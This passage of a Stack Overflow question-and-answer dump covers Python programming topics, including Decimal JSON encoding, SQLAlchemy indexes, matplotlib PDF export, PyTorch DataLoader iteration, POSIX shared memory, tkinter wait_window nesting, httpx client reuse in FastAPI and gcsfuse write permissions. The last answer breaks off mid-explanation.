<pre><code>&gt;&gt;&gt; MyJSONEncoder().encode(dct)
'{&quot;abc&quot;: &quot;4.4257052820783003&quot;}'
</code></pre>
<p>How can I serialize a <code>Decimal</code> object to a JSON number (real) instead of a JSON string? In other words, I want the encode operation to return the original <code>json_string</code> string. Ideally without using external packages (but solutions using external packages are still welcome).</p>
<p>This question is of course very related but I can't find an answer there: <a href=""https://stackoverflow.com/questions/1960516/python-json-serialize-a-decimal-object"">Python JSON serialize a Decimal object</a>.</p>
","74106182","<p>The following only uses the default library. It works by effectively &quot;overriding&quot; json.encoder._make_iterencode (see discussion below, after this example)...</p>
<pre><code>from decimal import Decimal
import json

def _our_make_iterencode(markers, _default, _encoder, _indent, _floatstr,
        _key_separator, _item_separator, _sort_keys, _skipkeys, _one_shot,
        ## HACK: hand-optimized bytecode; turn globals into locals
        ValueError=ValueError,
        dict=dict,
        float=float,
        id=id,
        int=int,
        isinstance=isinstance,
        list=list,
        str=str,
        tuple=tuple,
        _intstr=int.__repr__,
    ):

    if _indent is not None and not isinstance(_indent, str):
        _indent = ' ' * _indent

    def _iterencode_list(lst, _current_indent_level):

        if not lst:
            yield '[]'
            return
        if markers is not None:
            markerid = id(lst)
            if markerid in markers:
                raise ValueError(&quot;Circular reference detected&quot;)
            markers[markerid] = lst
        buf = '['
        if _indent is not None:
            _current_indent_level += 1
            newline_indent = '\n' + _indent * _current_indent_level
            separator = _item_separator + newline_indent
            buf += newline_indent
        else:
            newline_indent = None
            separator = _item_separator
        first = True
        for value in lst:
            if first:
                first = False
            else:
                buf = separator
            if isinstance(value, str):
                yield buf + _encoder(value)
            elif value is None:
                yield buf + 'null'
            elif value is True:
                yield buf + 'true'
            elif value is False:
                yield buf + 'false'
            elif isinstance(value, int):
                # Subclasses of int/float may override __repr__, but we still
                # want to encode them as integers/floats in JSON. One example
                # within the standard library is IntEnum.
                yield buf + _intstr(value)
            elif isinstance(value, float):
                # see comment above for int
                yield buf + _floatstr(value)
            else:
                yield buf
                if isinstance(value, (list, tuple)):
                    chunks = _iterencode_list(value, _current_indent_level)
                elif isinstance(value, dict):
                    chunks = _iterencode_dict(value, _current_indent_level)
                else:
                    chunks = _iterencode(value, _current_indent_level)
                yield from chunks
        if newline_indent is not None:
            _current_indent_level -= 1
            yield '\n' + _indent * _current_indent_level
        yield ']'
        if markers is not None:
            del markers[markerid]

    def _iterencode_dict(dct, _current_indent_level):
        if not dct:
            yield '{}'
            return
        if markers is not None:
            markerid = id(dct)
            if markerid in markers:
                raise ValueError(&quot;Circular reference detected&quot;)
            markers[markerid] = dct
        yield '{'
        if _indent is not None:
            _current_indent_level += 1
            newline_indent = '\n' + _indent * _current_indent_level
            item_separator = _item_separator + newline_indent
            yield newline_indent
        else:
            newline_indent = None
            item_separator = _item_separator
        first = True
        if _sort_keys:
            items = sorted(dct.items())
        else:
            items = dct.items()
        for key, value in items:
            if isinstance(key, str):
                pass
            # JavaScript is weakly typed for these, so it makes sense to
            # also allow them.  Many encoders seem to do something like this.
            elif isinstance(key, float):
                # see comment for int/float in _make_iterencode
                key = _floatstr(key)
            elif key is True:
                key = 'true'
            elif key is False:
                key = 'false'
            elif key is None:
                key = 'null'
            elif isinstance(key, int):
                # see comment for int/float in _make_iterencode
                key = _intstr(key)
            elif _skipkeys:
                continue
            else:
                raise TypeError(f'keys must be str, int, float, bool or None, '
                                f'not {key.__class__.__name__}')
            if first:
                first = False
            else:
                yield item_separator
            yield _encoder(key)
            yield _key_separator
            if isinstance(value, str):
                yield _encoder(value)
            elif value is None:
                yield 'null'
            elif value is True:
                yield 'true'
            elif value is False:
                yield 'false'
            elif isinstance(value, int):
                # see comment for int/float in _make_iterencode
                yield _intstr(value)
            elif isinstance(value, float):
                # see comment for int/float in _make_iterencode
                yield _floatstr(value)
            else:
                if isinstance(value, (list, tuple)):
                    chunks = _iterencode_list(value, _current_indent_level)
                elif isinstance(value, dict):
                    chunks = _iterencode_dict(value, _current_indent_level)
                else:
                    chunks = _iterencode(value, _current_indent_level)
                yield from chunks
        if newline_indent is not None:
            _current_indent_level -= 1
            yield '\n' + _indent * _current_indent_level
        yield '}'
        if markers is not None:
            del markers[markerid]

    def _iterencode(o, _current_indent_level):
        if isinstance(o, str):
            yield _encoder(o)
        elif isinstance(o, Decimal):
            yield str(o) # unquoted string.
        elif o is None:
            yield 'null'
        elif o is True:
            yield 'true'
        elif o is False:
            yield 'false'
        elif isinstance(o, int):
            # see comment for int/float in _make_iterencode
            yield _intstr(o)
        elif isinstance(o, float):
            # see comment for int/float in _make_iterencode
            yield _floatstr(o)
        elif isinstance(o, (list, tuple)):
            yield from _iterencode_list(o, _current_indent_level)
        elif isinstance(o, dict):
            yield from _iterencode_dict(o, _current_indent_level)
        else:
            if markers is not None:
                markerid = id(o)
                if markerid in markers:
                    raise ValueError(&quot;Circular reference detected&quot;)
                markers[markerid] = o
            o = _default(o)
            yield from _iterencode(o, _current_indent_level)
            if markers is not None:
                del markers[markerid]
    return _iterencode

class BigDecimalJSONEncoder(json.JSONEncoder):
 
    def iterencode(self, o, _one_shot=False):
        &quot;&quot;&quot;Encode the given object and yield each string
        representation as available.

        For example::

            for chunk in JSONEncoder().iterencode(bigobject):
                mysocket.write(chunk)

        &quot;&quot;&quot;
        if self.check_circular:
            markers = {}
        else:
            markers = None
        if self.ensure_ascii:
            _encoder = json.encoder.encode_basestring_ascii
        else:
            _encoder = json.encoder.encode_basestring

        def floatstr(o, allow_nan=self.allow_nan,
                _repr=float.__repr__, _inf=json.encoder.INFINITY, _neginf=-json.encoder.INFINITY):
            # Check for specials.  Note that this type of test is processor
            # and/or platform-specific, so do tests which don't depend on the
            # internals.

            if o != o:
                text = 'NaN'
            elif o == _inf:
                text = 'Infinity'
            elif o == _neginf:
                text = '-Infinity'
            else:
                return _repr(o)

            if not allow_nan:
                raise ValueError(
                    &quot;Out of range float values are not JSON compliant: &quot; +
                    repr(o))

            return text

        _one_shot = False
        if (_one_shot and json.encoder.c_make_encoder is not None
                and self.indent is None):
            _iterencode = json.encoder.c_make_encoder(
                markers, self.default, _encoder, self.indent,
                self.key_separator, self.item_separator, self.sort_keys,
                self.skipkeys, self.allow_nan)
        else:
            _iterencode = _our_make_iterencode(
                markers, self.default, _encoder, self.indent, floatstr,
                self.key_separator, self.item_separator, self.sort_keys,
                self.skipkeys, _one_shot)
        return _iterencode(o, 0)

json_string = '{&quot;abc&quot;: 4.4257052820783003}'
dct = json.loads(json_string, parse_float=Decimal)
print(f&quot;decoded={dct}&quot;)
print(f&quot;encoded={json.dumps(dct, cls=BigDecimalJSONEncoder, indent=4)}&quot;)
</code></pre>
<p><strong>Example output:</strong></p>
<pre><code>decoded={'abc': Decimal('4.4257052820783003')}
encoded={
    &quot;abc&quot;: 4.4257052820783003
}
</code></pre>
<p><strong>Discussion:</strong></p>
<p>The main problem is that json.encoder does not provide an acceptable way to override json.JSONEncoder to a return string (i.e., from json.JSONEncoder.default) that is to be accepted as raw ready-to-go JSON string.</p>
<p>For example, consider the following <em>pseudo</em> ideal override...</p>
<pre><code>class IdealDecimalEncoder(json.JSONEncoder):
    def default(self, o) -&gt; Union[Any, tuple[str, bool]]:
        if isinstance(o, Decimal):
            return str(o), False # return object (str) and False which means &quot;do not quote&quot;.
        return super().default(o)
</code></pre>
<p>The above allows <code>default</code> to return the object (as it does today) or a tuple, where the second value is False if no further encoding should be performed (i.e., a string that should not be quoted). As we know, this is not supported.</p>
<p>The next question would then be, what lies between the call to <code>default</code> and <code>iterencode</code>... unfortunately, it's the <code>json.encoder._make_iterencode</code> function which essentially produces a generator that relies on several &quot;private&quot; functions. If this were a class, or if the functions were broken out and accessible, you could perform a more terse override.</p>
<p>In my working example above, I essentially copy/pasted <code>_make_iterencode</code> simply to add the following single case to the private <code>_iterencode</code> generator...</p>
<pre><code>    ...
    elif isinstance(o, Decimal):
        yield str(o) # unquoted string.
    ...
</code></pre>
<p>This obviously works because it returns an unquoted string. The 'str' case always uses _encoder which assumes a string requiring quotes for JSON, where the override bypasses that for Decimal.</p>
<p>Not a great solution but the only reasonable one I can see which uses only the built-in library which does not require parsing/decoding/modifying encoded JSON during the encoding process.</p>
<p>It has not been tested beyond the @Riccardo Bucco (OP)'s example.</p>
<p>Assuming no unforeseen back-compat issue, it seems it would be a relatively easy to modify Python to include this for Decimal.</p>
<p>Without something built in, I'm wondering if it's best, for now, to use one of the other JSON libraries supporting Decimal as others have discussed.</p>
"
"73623986","1","SQLAlchemy How to create a composite index between a polymorphic class and it's subclass","<p>I am trying to get a composite index working between a polymorphic subclass and it's parent.</p>
<p>Alembic autogenerate does not seem to detect Indexes outside of <code>__table_args__</code>.</p>
<p>I can't use <code>__table_args__</code> because, being in the subclass, it does not count my class as having a <code>__table__</code>.</p>
<p>How do I create a composite Index between these?</p>
<pre class=""lang-py prettyprint-override""><code>class Main(Base, SomeMixin):
    __tablename__ = &quot;main&quot;
    __table_args__ = (
        # Some constraints and Indexes specific to main
    )

    id = Column(String, primary_key=True, default=func.generate_object_id())

    mtype = Column(String, nullable=False)

    __mapper_args__ = {&quot;polymorphic_on&quot;: mtype}

class SubClass(Main):
    __mapper_args__ = {&quot;polymorphic_identity&quot;: &quot;subclass&quot;}

    bid = Column(String, ForeignKey(&quot;other.id&quot;, ondelete=&quot;CASCADE&quot;))

    # My index specific to Subclass
    Index(
        &quot;ix_main_bid_mtype&quot;,
        &quot;bid&quot;,
        &quot;mtype&quot;,
    )
</code></pre>
<p>The goal is to have something like this pop with alembic autogenerate:</p>
<pre class=""lang-py prettyprint-override""><code>def upgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    op.create_index(
        &quot;ix_main_bid_mtype&quot;,
        &quot;main&quot;,
        [&quot;bid&quot;, &quot;mtype&quot;],
        unique=False,
    )
    # ### end Alembic commands ###


def downgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    op.drop_index(op.f(&quot;ix_main_bid_mtype&quot;), table_name=&quot;main&quot;)
    # ### end Alembic commands ###
</code></pre>
<p>Thank you for your time and potential future help.</p>
<p>EDIT:
Note: The other fields are detected by autogenerate, only the index done this way does not seem to work.</p>
","73675717","<p>Create the index externally after both classes:</p>
<pre class=""lang-py prettyprint-override""><code>class Main(Base, SomeMixin):
    __tablename__ = &quot;main&quot;
    __table_args__ = (
        # Some constraints and Indexes specific to main
    )

    id = Column(String, primary_key=True, default=func.generate_object_id())

    mtype = Column(String, nullable=False)

    __mapper_args__ = {&quot;polymorphic_on&quot;: mtype}


class SubClass(Main):
    __mapper_args__ = {&quot;polymorphic_identity&quot;: &quot;subclass&quot;}

    bid = Column(String, ForeignKey(&quot;other.id&quot;, ondelete=&quot;CASCADE&quot;))


Index(&quot;ix_main_bid_mtype&quot;, SubClass.bid, SubClass.mtype)
</code></pre>
"
"73485081","1","Save the multiple images into PDF without chainging the format of Subplot","<p>I've a <code>df</code> like this as shown below. What I'm doing is I'm trying to loop through the <code>df</code> column(s) with paths &amp; printing the image as sub plots one column with image paths at <code>axis0</code> and other column paths parallely on <code>axis1</code> as follows.</p>
<pre><code>      identity       VGG-Face_cosine    img                 comment
0   ./clip_v4/3.png   1.110223e-16  .\clip_v3\0.png        .\clip_v3\0.png is matched with ./clip_v4/3.png
0   ./clip_v4/2.png   2.220446e-16  .\clip_v3\1.png        .\clip_v3\1.png is matched with ./clip_v4/2.png
1   ./clip_v4/4.png   2.220446e-16  .\clip_v3\1.png        .\clip_v3\1.png is matched with ./clip_v4/4.png
2   ./clip_v4/5.png   2.220446e-16  .\clip_v3\1.png        .\clip_v3\1.png is matched with ./clip_v4/5.png
0   ./clip_v4/2.png   2.220446e-16  .\clip_v3\2.png        .\clip_v3\2.png is matched with 
</code></pre>
<p>I'm looping through these 2 columns <code>identity</code>  and  <code>img</code> columns &amp; plotting as follows</p>
<pre><code>import pandas as pd
import matplotlib.pyplot as plt
import matplotlib.image as mpimg
from matplotlib import rcParams


df = df.iloc[1:]
#merged_img = []


for index, row in df.iterrows():

    # figure size in inches optional
    rcParams['figure.figsize'] = 11 ,8

    # read images
    
    img_A = mpimg.imread(row['identity'])
    img_B = mpimg.imread(row['img'])

    # display images
    fig, ax = plt.subplots(1,2)
 
    
    ax[0].imshow(img_A)
    ax[1].imshow(img_B)
    
    
</code></pre>
<p>sample output I got.</p>
<p><strong>###Console output</strong></p>
<p><a href=""https://i.stack.imgur.com/3HA1D.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/3HA1D.png"" alt=""sample console output"" /></a></p>
<p>Upto now it's fine. My next idea is to save these images as it is with sublots on <code>PDF</code>. I don't want to change the structure the way it prints. Like I just want 2 images side by side in PDF too. I've went through many available solutions. But, I can't relate my part of code with the logic avaiable in <code>documentation</code>. Is there is any way to achieve my goal?. Any references would be helpful!!. Thanks in advance.</p>
","73530424","<p>Use <code>PdfPages</code> from <code>matplotlib.backends.backend_pdf</code> to save figures one by one on separate pages of the same pdf-file:</p>
<pre><code>import pandas as pd
import matplotlib.pyplot as plt
import matplotlib.image as mpimg
from matplotlib import rcParams
from matplotlib.backends.backend_pdf import PdfPages

df = df.iloc[1:]
rcParams['figure.figsize'] = 11 ,8
pdf_file_name = 'my_images.pdf' 

with PdfPages(pdf_file_name) as pdf:

    for index, row in df.iterrows():
        img_A = mpimg.imread(row['identity'])
        img_B = mpimg.imread(row['img'])
        fig, ax = plt.subplots(1,2)
        ax[0].imshow(img_A)
        ax[1].imshow(img_B)

        # save the current figure at a new page in pdf_file_name
        pdf.savefig()   
</code></pre>
<p>See also <a href=""https://matplotlib.org/stable/api/backend_pdf_api.html"" rel=""nofollow noreferrer"">https://matplotlib.org/stable/api/backend_pdf_api.html</a></p>
"
"74289077","1","AttributeError: '_MultiProcessingDataLoaderIter' object has no attribute 'next'","<p>I am trying to load the dataset using <code>Torch Dataset and DataLoader</code>, but I got the following error:</p>
<pre><code>AttributeError: '_MultiProcessingDataLoaderIter' object has no attribute 'next'
</code></pre>
<p>the code I use is:</p>
<pre><code>class WineDataset(Dataset):

    def __init__(self):
        # Initialize data, download, etc.
        # read with numpy or pandas
        xy = np.loadtxt('./data/wine.csv', delimiter=',', dtype=np.float32, skiprows=1)
        self.n_samples = xy.shape[0]

        # here the first column is the class label, the rest are the features
        self.x_data = torch.from_numpy(xy[:, 1:]) # size [n_samples, n_features]
        self.y_data = torch.from_numpy(xy[:, [0]]) # size [n_samples, 1]

    # support indexing such that dataset[i] can be used to get i-th sample
    def __getitem__(self, index):
        return self.x_data[index], self.y_data[index]

    # we can call len(dataset) to return the size
    def __len__(self):
        return self.n_samples

    dataset = WineDataset()
        
    train_loader = DataLoader(dataset=dataset,
                              batch_size=4,
                              shuffle=True,
                              num_workers=2)
</code></pre>
<p>I tried to make the num_workers=0, still have the same error.</p>
<pre><code>Python version 3.8.9
PyTorch version 1.13.0
</code></pre>
","74331018","<p>I too faced the same issue, when i tried to call the next() method as follows</p>
<pre><code>dataiter = iter(dataloader)
data = dataiter.next()
</code></pre>
<p>You need to use the following instead and it works perfectly:</p>
<pre><code>dataiter = iter(dataloader)
data = next(dataiter)
</code></pre>
<p>Finally your code should look like follows:</p>
<pre><code>class WineDataset(Dataset):

    def __init__(self):
        # Initialize data, download, etc.
        # read with numpy or pandas
        xy = np.loadtxt('./data/wine.csv', delimiter=',', dtype=np.float32, skiprows=1)
        self.n_samples = xy.shape[0]

        # here the first column is the class label, the rest are the features
        self.x_data = torch.from_numpy(xy[:, 1:]) # size [n_samples, n_features]
        self.y_data = torch.from_numpy(xy[:, [0]]) # size [n_samples, 1]

    # support indexing such that dataset[i] can be used to get i-th sample
    def __getitem__(self, index):
        return self.x_data[index], self.y_data[index]

    # we can call len(dataset) to return the size
    def __len__(self):
        return self.n_samples

    dataset = WineDataset()
        
    train_loader = DataLoader(dataset=dataset,
                              batch_size=4,
                              shuffle=True,
                              num_workers=2)

dataiter = iter(dataloader)
data = next(dataiter)
</code></pre>
"
"73719101","1","Connecting a C++ program to a Python script with shared memory","<p>I'm trying to connect a C++ program to python using shared memory but I don't know how to pass the name of the memory segment to python.</p>
<p>Here is my C++ code:</p>
<pre><code>key_t key = ftok(&quot;address&quot;, 1);
int shm_o;
char* msg = &quot;hello there&quot;;
int len = strlen(msg) + 1;
void* addr;

shm_o = shmget(key, 20, IPC_CREAT | 0600);
if(shm_o == -1)
{
    std::cout &lt;&lt; &quot;Failed: shmget.\n&quot;;
    return 1;
}

addr = shmat(shm_o, NULL, 0);
if(addr == (void*) -1)
{
    std::cout &lt;&lt; &quot;Failed: shmat.\n&quot;;
    return 1;
}

std::cout &lt;&lt; &quot;Shared memory segment created successfully with id: &quot; &lt;&lt; shm_o;
memcpy(addr, msg, len);

getchar();
return 0;
</code></pre>
<p>I'm trying to get python to read from the shared memory segment like so:</p>
<pre><code>shm_a = shared_memory.SharedMemory(name=&quot;address&quot;, create=False, size=20)

print(bytes(shm_a.buf[:11]))
</code></pre>
<p>but it throws an exception saying there is no file or directory called 'address'.</p>
<p>Am I going about this correctly or is there another way to attach python to the shared memory segment?</p>
<p>Any help would be much appreciated.</p>
","73720808","<p>Taking the liberty to post a working example here for POSIX shared memory segments, which will work across C/C++ and Python on Linux/UNIX-like systems. This will <strong>not</strong> work on Windows.</p>
<h2>C++ code to create and write data into a shared memory segment (name provided on command line):</h2>
<pre><code>#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

#include &lt;iostream&gt;
#include &lt;string&gt;

int main(int argc, char * argv[])
{
    if (argc != 2) {
         std::cerr &lt;&lt; &quot;Argument &lt;shmem_name&gt; required&quot; &lt;&lt; std::endl;
         return 1;
    }
    const char * shmem_name = argv[1];
    size_t shm_size = 4096;
    int shmem_fd = shm_open(shmem_name, O_CREAT|O_RDWR, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP);
    if (shmem_fd == -1) {
         perror(&quot;shm_open&quot;);
         return 1;
    }
    std::cout &lt;&lt; &quot;Shared Memory segment created with fd &quot; &lt;&lt; shmem_fd &lt;&lt; std::endl;
    if (ftruncate(shmem_fd, shm_size) == -1) {
        perror(&quot;ftruncate&quot;);
        return 1;
    }
    std::cout &lt;&lt; &quot;Shared Memory segment resized to &quot; &lt;&lt; shm_size &lt;&lt; std::endl;
    void * addr = mmap(0, shm_size, PROT_WRITE, MAP_SHARED, shmem_fd, 0);
    if (addr == MAP_FAILED) {
        perror(&quot;mmap&quot;);
        return 1;
    }
    std::cout &lt;&lt; &quot;Please enter some text to write to shared memory segment\n&quot;;
    std::string text;
    std::getline(std::cin, text);
    while (! text.empty()) {
        strncpy((char *)addr, text.data(), shm_size);
        std::cout &lt;&lt; &quot;Written '&quot; &lt;&lt; text &lt;&lt; &quot;' to shared memory segment\n&quot;;
        std::getline(std::cin, text);
    }
    std::cout &lt;&lt; &quot;Unlinking shared memory segment.&quot; &lt;&lt; std::endl;
    shm_unlink(shmem_name) ;
}
</code></pre>
<h2>Python code to read any string from the beginning of the shared memory segment:</h2>
<pre><code>import sys
from multiprocessing import shared_memory, resource_tracker

if len(sys.argv) != 2:
    print(&quot;Argument &lt;shmem_name&gt; required&quot;)
    sys.exit(1)

shm_seg = shared_memory.SharedMemory(name=sys.argv[1])
print(bytes(shm_seg.buf).strip(b'\x00').decode('ascii'))
shm_seg.close()
# Manually remove segment from resource_tracker, otherwise shmem segment
# will be unlinked upon program exit
resource_tracker.unregister(shm_seg._name, &quot;shared_memory&quot;)
</code></pre>
"
"73566474","1","Unable to locate package python-openssl","<p>I'm trying to install Pyenv, and I'm running on Ubuntu 22.04 LTS. but whenever I run this command</p>
<pre><code>sudo apt install -y make build-essential libssl-dev zlib1g-dev \ libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev \ libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl \ git
</code></pre>
<p>I get this error</p>
<pre class=""lang-none prettyprint-override""><code>Unable to locate package python-openssl
</code></pre>
<p>I've tried searching for solutions online, but I think they have encountered it on older versions of Ubuntu and not on the latest version.</p>
","73566675","<p>Make sure your list of packages is updated (<code>sudo apt update</code>). Python openssl bindings are available in 22.04 in <code>python3-openssl</code> (<a href=""https://packages.ubuntu.com/jammy/python3-openssl"" rel=""noreferrer"">link</a>), so you can install it by running</p>
<pre><code>sudo apt install python3-openssl
</code></pre>
"
"74370984","1","Is tkwait wait_variable/wait_window/wait_visibility broken?","<p>I recently started to use <a href=""https://www.tcl.tk/man/tcl/TkCmd/tkwait.html"" rel=""nofollow noreferrer"">tkwait</a> casually and noticed that some functionality only works under special conditions. For example:</p>
<pre class=""lang-py prettyprint-override""><code>import tkinter as tk

def w(seconds):
    dummy = tk.Toplevel(root)
    dummy.title(seconds)
    dummy.after(seconds*1000, lambda x=dummy: x.destroy())
    dummy.wait_window(dummy)
    print(seconds)

root = tk.Tk()
for i in [5,2,10]:
    w(i)
root.mainloop()
</code></pre>
<p>The code above works just fine and as expected:</p>
<ol>
<li>The for loop calls the function</li>
<li>The function runs and blocks the code for x seconds</li>
<li>The window gets destroyed and the for loop continues</li>
</ol>
<p>But in a more event driven environment these <code>tkwait</code> calls gets tricky. The documentation states quote:</p>
<blockquote>
<p>If an event handler invokes tkwait again, <strong>the nested call to tkwait
must complete before the outer call can complete</strong>.</p>
</blockquote>
<p>Instead of an output of <code>&gt;&gt;5</code> <code>&gt;&gt;2</code> <code>&gt;&gt;10</code> you will get <code>&gt;&gt;10</code> <code>&gt;&gt;2</code> <code>&gt;&gt;5</code> because the nested call blocks the inner and the outer will block the inner. I suspect a nested <em>event loop</em> or an equivalent of the mainloop <em>processes events in the normal fashion</em> while waiting.</p>
<p>Am I doing something wrong by using this feature? Because if you think about it, <a href=""https://stackoverflow.com/a/72251524/13629335"">nearly all tkinter dialog windows are using this feature</a> and I've never read about this behavior before.</p>
<p>An event driven example might be:</p>
<pre><code>import tkinter as tk

def w(seconds):
    dummy = tk.Toplevel(root)
    dummy.title(seconds)
    dummy.after(seconds*1000, lambda x=dummy: x.destroy())
    dummy.wait_window(dummy)
    print(seconds)

root = tk.Tk()
btn1 = tk.Button(
    root, command=lambda : w(5), text = '5 seconds')
btn2 = tk.Button(
    root, command=lambda : w(2), text = '2 seconds')
btn3 = tk.Button(
    root, command=lambda : w(10), text = '10 seconds')
btn1.pack()
btn2.pack()
btn3.pack()
root.mainloop()
</code></pre>
<p>As an additional problem that raises with <code>wait_something</code> is that <a href=""https://stackoverflow.com/a/74162322/13629335"">it will prevent your process to finish</a> if the <code>wait_something</code> never was released.</p>
","74376258","<p>Basically, you need great care if you're using an inner event loop because:</p>
<ol>
<li>Conditions that would terminate the outer event loop aren't checked for until the inner event loop(s) are finished.</li>
<li>It's really quite easy to end up recursively entering an inner event loop by accident.</li>
</ol>
<p>The recursive entry problem is usually most easily handled by disabling the path that enters the event loop while the inner event loop runs. There's often an obvious way to do this, such as disabling the button that you'd click.</p>
<p>The condition handling is rather more difficult. In Tcl, you'd handle it by restructuring things slightly using a coroutine so that the thing that looks like an inner event loop isn't, but rather is just parking things until the condition is satisfied. That option is... rather more difficult to do in Python as the language implementation isn't fully non-recursive (and I'm not sure that Tkinter is set up to handle the mess of async function coloring). Fortunately, provided you're careful, it's not too difficult.</p>
<p>It helps if you know that <code>wait_window</code> is waiting for a <code>&lt;Destroy&gt;</code> event where the target window is the toplevel (and not one of the inner components) <em>and</em> that destroying the main window will trigger it as all the other windows are also destroyed when you do that. In short, as long as you avoid reentrancy you'll be fine with it. You just need to arrange for the button that was clicked to be disabled while the wait is ongoing; that's good from a UX perspective too (the user can't do it, so don't provide the visual hint that they can).</p>
<pre class=""lang-py prettyprint-override""><code>def w(seconds, button):
    dummy = tk.Toplevel(root)
    dummy.title(seconds)
    dummy.after(seconds*1000, lambda x=dummy: x.destroy())
    button[&quot;state&quot;] = &quot;disabled&quot;  # &lt;&lt;&lt; This, before the wait
    dummy.wait_window(dummy)
    button[&quot;state&quot;] = &quot;normal&quot;    # &lt;&lt;&lt; This, after the wait
    print(seconds)

btn1 = tk.Button(root, text = '5 seconds')
# Have to set the command after creation to bind the button handle to the callback
btn1[&quot;command&quot;] = (lambda : w(5, btn1))
</code></pre>
<p>This all omits little things like error handling.</p>
"
"71031816","1","how do you properly reuse an httpx.AsyncClient wihtin a FastAPI application?","<p>I have a FastAPI application which, in several different occasions, needs to call external APIs. I use httpx.AsyncClient for these calls. The point is that I don't fully understand how I shoud use it.</p>
<p>From <a href=""https://www.python-httpx.org/async/"" rel=""noreferrer"">httpx' documentation</a> I should use context managers,</p>
<pre><code>async def foo():
    &quot;&quot;&quot;&quot;
    I need to call foo quite often from different 
    parts of my application
    &quot;&quot;&quot;
    async with httpx.AsyncClient() as aclient:
        # make some http requests, e.g.,
        await aclient.get(&quot;http://example.it&quot;)
</code></pre>
<p>However, I understand that in this way a new client is spawned each time I call <code>foo()</code>, and is precisely what we want to avoid by using a client in the first place.</p>
<p>I suppose an alternative would be to have some global client defined somewhere, and just import it whenever I need it like so</p>
<pre><code>aclient = httpx.AsyncClient()

async def bar():
    # make some http requests using the global aclient, e.g.,
    await aclient.get(&quot;http://example.it&quot;)
</code></pre>
<p>This second option looks somewhat fishy, though, as nobody is taking care of closing the session and the like.</p>
<p>So the question is: how do I properly (re)use <code>httpx.AsyncClient()</code> within a FastAPI application?</p>
","74397436","<p>You can have a global client that is closed in the FastApi shutdown event.</p>
<pre><code>import logging
from fastapi import FastAPI
import httpx

logging.basicConfig(level=logging.INFO, format=&quot;%(levelname)-9s %(asctime)s - %(name)s - %(message)s&quot;)
LOGGER = logging.getLogger(__name__)


class HTTPXClientWrapper:

    async_client = None

    def start(self):
        &quot;&quot;&quot; Instantiate the client. Call from the FastAPI startup hook.&quot;&quot;&quot;
        self.async_client = httpx.AsyncClient()
        LOGGER.info(f'httpx AsyncClient instantiated. Id {id(self.async_client)}')

    async def stop(self):
        &quot;&quot;&quot; Gracefully shutdown. Call from FastAPI shutdown hook.&quot;&quot;&quot;
        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed} - Now close it. Id (will be unchanged): {id(self.async_client)}')
        await self.async_client.aclose()
        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed}. Id (will be unchanged): {id(self.async_client)}')
        self.async_client = None
        LOGGER.info('httpx AsyncClient closed')

    def __call__(self):
        &quot;&quot;&quot; Calling the instantiated HTTPXClientWrapper returns the wrapped singleton.&quot;&quot;&quot;
        # Ensure we don't use it if not started / running
        assert self.async_client is not None
        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed}. Id (will be unchanged): {id(self.async_client)}')
        return self.async_client


httpx_client_wrapper = HTTPXClientWrapper()
app = FastAPI()


@app.get('/test-call-external')
async def call_external_api(url: str = 'https://stackoverflow.com'):
    async_client = httpx_client_wrapper()
    res = await async_client.get(url)
    result = res.text
    return {
        'result': result,
        'status': res.status_code
    }


@app.on_event(&quot;startup&quot;)
async def startup_event():
    httpx_client_wrapper.start()


@app.on_event(&quot;shutdown&quot;)
async def shutdown_event():
    await httpx_client_wrapper.stop()


if __name__ == '__main__':
    import uvicorn
    LOGGER.info(f'starting...')
    uvicorn.run(f&quot;{__name__}:app&quot;, host=&quot;127.0.0.1&quot;, port=8000)


</code></pre>
<p>Note - this answer was inspired by a similar answer I saw elsewhere a long time ago for <code>aiohttp</code>, I can't find the reference but thanks to whoever that was!</p>
<h3>EDIT</h3>
<p>I've added uvicorn bootstrapping in the example so that it's now fully functional. I've also added logging to show what's going on on startup and shutdown, and you can visit <code>localhost:8000/docs</code> to trigger the endpoint and see what happens (via the logs).</p>
<p>The reason for calling the <code>start()</code> method from the startup hook is that by the time the hook is called the eventloop has already started, so we know we will be instantiating the httpx client in an async context.</p>
<p>Also I was missing the <code>async</code> on the <code>stop()</code> method, and had a <code>self.async_client = None</code> instead of just <code>async_client = None</code>, so I have fixed those errors in the example.</p>
"
"73722570","1","Unable to write files in a GCP bucket using gcsfuse","<p>I have mounted a storage bucket on a VM using the command:</p>
<pre><code>gcsfuse my-bucket /path/to/mount
</code></pre>
<p>After this I'm able to read files from the bucket in Python using Pandas, but I'm not able to write files nor create new folders. I have tried with Python and from the terminal using sudo but get the same error.</p>
<p>I have also tried Using the key_file from the bucket:</p>
<pre><code>sudo mount -t gcsfuse -o implicit_dirs,allow_other,uid=1000,gid=1000,key_file=Notebooks/xxxxxxxxxxxxxx10b3464a1aa9.json &lt;BUCKET&gt; &lt;PATH&gt;
</code></pre>
<p>It does not through errors when I run the code, but still I'm not able to write in the bucket.</p>
<p>I have also <a href=""https://github.com/GoogleCloudPlatform/gcsfuse/blob/master/README.md"" rel=""nofollow noreferrer"">tried</a>:</p>
<pre><code>gcloud auth login
</code></pre>
<p>But still have the same issue.</p>
","73764622","<p>I ran into the same thing a while ago, which was really confusing. You have to set the correct access scope for the virtual machine so that anyone using the VM is able to call the storage API. The <a href=""https://cloud.google.com/compute/docs/access/service-accounts?hl=en_US&amp;_ga=2.230836319.-1947653428.1512761321#accesscopesiam"" rel=""nofollow noreferrer"">documentation</a> shows that the default access scope for storage on a VM is read-only:</p>
<blockquote>
<p>When you create a new Compute Engine instance, it is automatically
configured with the following access scopes:</p>
<ul>
<li>Read-only access to Cloud Storage:
https://www.googleapis.com/auth/devstorage.read_only</li>
</ul>
</blockquote>
<p>All you have to do is change this scope so that you are also able to write to storage buckets from the VM. You can find an overview of different scopes <a href=""https://cloud.google.com/sdk/gcloud/reference/beta/compute/instances/set-scopes"" rel=""nofollow noreferrer"">here</a>. To apply the new scope to your VM, you have to first shut it down. Then from your local machine execute the following command:</p>
